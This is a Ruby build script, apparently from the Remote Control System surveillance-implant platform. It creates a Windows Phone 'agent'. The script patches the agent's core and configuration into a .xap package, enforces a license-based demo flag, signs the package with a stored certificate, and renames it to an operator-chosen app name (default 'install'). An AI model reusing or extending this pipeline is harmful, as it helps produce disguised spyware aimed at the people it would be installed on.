#
#  Agent creation for winMo
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWinPhone < Build

  def initialize
    super
    @platform = 'winphone'
  end

  def unpack
    super

    trace :debug, "Build: xap extract"

    Zip::File.open(path('core.xap')) do |z|
      z.each do |f|
        f_path = path('xap/' + f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
      end
    end
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'xap/MyPhoneInfo.dat'
    params[:config] = 'xap/fmh58t4.wph'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :winmo, params['demo']

    # invoke the generic patch method with the new params
    super

    # replace the two files inside the xap
    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{path(params[:core])}"
    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{path(params[:config])}"
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'

    raise "Certificate file for Windows Phone not found" unless File.exist? Config.instance.cert("winphone.pfx")
    raise "Aetx file for Windows Phone not found" unless File.exist? Config.instance.cert("winphone.aetx")

    # sign the xap
    CrossPlatform.exec path('XapSignTool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("winphone.pfx")} #{path('core.xap')}", {:chdir => path('')}

    FileUtils.mv path('core.xap'), path(@appname + '.xap')
    FileUtils.mv Config.instance.cert('winphone.aetx'), path(@appname + '.aetx')

    @outputs = [@appname + '.xap', @appname + '.aetx']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
      @outputs.each do |output|
        if File.file?(path(output))
          z.file.open(output, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
        end
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  end

  def unique(core)
    Zip::File.open(core) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))

        # skip empty dirs
        next if File.directory?(f.name)

        z.extract(f, f_path) unless File.exist?(f_path)
      end
    end

    Zip::File.open(path('core.xap')) do |z|
      core_content = z.file.open('MyPhoneInfo.dat', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('MyPhoneInfo.dat'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{Config.instance.temp('MyPhoneInfo.dat')}"
    FileUtils.rm_rf Config.instance.temp('MyPhoneInfo.dat')

    CrossPlatform.exec "zip", "-j -u #{core} #{path('core.xap')}"
  end

end

end #DB::
end #RCS::
